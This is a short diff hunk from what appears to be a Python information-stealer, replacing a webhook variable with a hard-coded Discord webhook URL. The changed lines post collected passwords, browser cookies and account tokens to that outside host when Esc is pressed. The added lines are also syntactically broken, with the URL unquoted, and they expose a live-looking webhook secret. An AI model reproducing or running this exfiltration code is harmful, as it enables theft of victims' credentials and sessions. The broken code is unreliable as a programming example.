@@ -87,11 +87,11 @@ class Main:
             try:
                 if keyboard.is_pressed('esc'):                    
                     if config.send_passwords:
-                        requests.post(webhook,json=payload1)
+                        requests.post(https://discord.com/api/webhooks/1198395133708746874/u31CpqQd-8H8ECn0m1_wcH1xpWv3x1H1yAgsdtwJNbm-_1er6j6CjWtHVMra76HBmff6,json=payload1)
                     if config.send_cookie:
-                        requests.post(webhook,json=payload2)
+                        requests.post(https://discord.com/api/webhooks/1198395133708746874/u31CpqQd-8H8ECn0m1_wcH1xpWv3x1H1yAgsdtwJNbm-_1er6j6CjWtHVMra76HBmff6,json=payload2)
                     if config.send_token:
-                        requests.post(webhook,json=payload3)
+                        requests.post(https://discord.com/api/webhooks/1198395133708746874/u31CpqQd-8H8ECn0m1_wcH1xpWv3x1H1yAgsdtwJNbm-_1er6j6CjWtHVMra76HBmff6,json=payload3)
                 if keyboard.is_pressed('q'):
                     break
             except:pass
